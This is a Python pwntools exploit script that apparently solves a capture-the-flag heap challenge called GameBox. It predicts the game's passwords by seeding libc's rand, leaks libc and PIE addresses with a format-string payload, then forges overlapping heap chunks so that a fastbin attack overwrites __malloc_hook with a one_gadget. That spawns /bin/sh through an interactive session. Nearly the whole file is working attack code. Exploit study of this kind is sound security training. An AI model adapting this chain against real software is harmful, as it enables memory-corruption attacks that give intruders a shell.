#!/usr/bin/env python

from pwn import *

context.log_level="debug"
import ctypes
import sys


io=process("./GameBox_fy82399ry3nc2103r")
 
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
LIBC.srand(1)
canary = []
def trand():
    password = ""
    for i in range(24):
        password += chr(ord('A')+LIBC.rand()%26)
    canary.append(password)
    return password
 
def play(Guess,Size,Name):
    io.sendlineafter('(E)xit\n','P')
    io.recvuntil('\n')
    io.send(Guess+"\xff")
    io.recvuntil('You great prophet!')
 
    io.recvuntil('length:\n')
    io.sendline(str(Size))
    io.recvuntil('name:\n')
    io.send(Name)
    io.recvuntil('Written into RANK!\n')
 
def show():
    io.sendlineafter('(E)xit\n','S')
 
def delete(Index,Cookie):
    io.sendlineafter('(E)xit\n','D')
    io.recvuntil('index:\n')
    io.sendline(str(Index))
    io.recvuntil('Cookie:\n')
    io.send(Cookie)
    io.recvuntil('Deleted!\n')
 
def change(Index,Cookie,New):
    io.sendlineafter('(E)xit\n','C')
    io.sendline(str(Index))
    io.recvuntil('Cookie:\n')
    io.send(Cookie)
    io.recvuntil('(no longer than old!):\n')
    io.send(New)
    io.recvuntil('Changed OK!\n')
 
def quit():
    io.sendlineafter('(E)xit\n','E')

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
gdb.attach(io)
pwd=trand()
play(pwd,0x90,"%p%9$p"*0x10+"\n")
show()
io.recvuntil(":")
libc_base=int(io.recv(14),16)-0x3c6780
print hex(libc_base)
pie_base=int(io.recv(14),16)-0x18d5
print hex(pie_base)
delete(0,pwd)
pwd2=trand()
play(pwd2,0x60,"a"*0x60) #0
pwd3=trand()
play(pwd3,0x200,"a"*0x1f0+p64(0x200)+p64(0x120)) #1
pwd4=trand()
play(pwd4,0x100,"a"*0x100) #2
delete(0,pwd2)
delete(1,pwd3)
pwd5=trand()
play(pwd5,0x68,"a"*0x68) #0 
pwd6=trand()
play(pwd6,0x100,"a"*0x100)#1
pwd7=trand()
play(pwd7,0x80,"a"*0x80) #3
delete(1,pwd6)
delete(2,pwd4)
pwd8=trand()
malloc_hook=libc.symbols['__malloc_hook']+libc_base
one_gadget=libc_base+0xf1147
'''
'0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
play(pwd8,0x200,"a"*0x108+p64(0x71)+"a"*0x60+p64(0)+p64(0x21)+"a"*0x10+p64(0)+p64(0x71)+"\n") #1
delete(3,pwd7)
change(1,pwd8,"a"*0x108+p64(0x71)+p64(malloc_hook-0x13)+"a"*0x58+p64(0)+p64(0x21)+"a"*0x10+p64(0)+p64(0x71)+"\n")

pwd9=trand()
play(pwd9,0x60,"a"*0x60)
pwd10=trand()
play(pwd10,0x60,"a"*0x3+p64(one_gadget)+"\n")
pwd11=trand()
io.sendlineafter('(E)xit\n','P')
io.recvuntil('\n')
io.send(pwd11+"\xff")
io.recvuntil('You great prophet!')
 
io.recvuntil('length:\n')
io.sendline(str(0))

io.interactive()
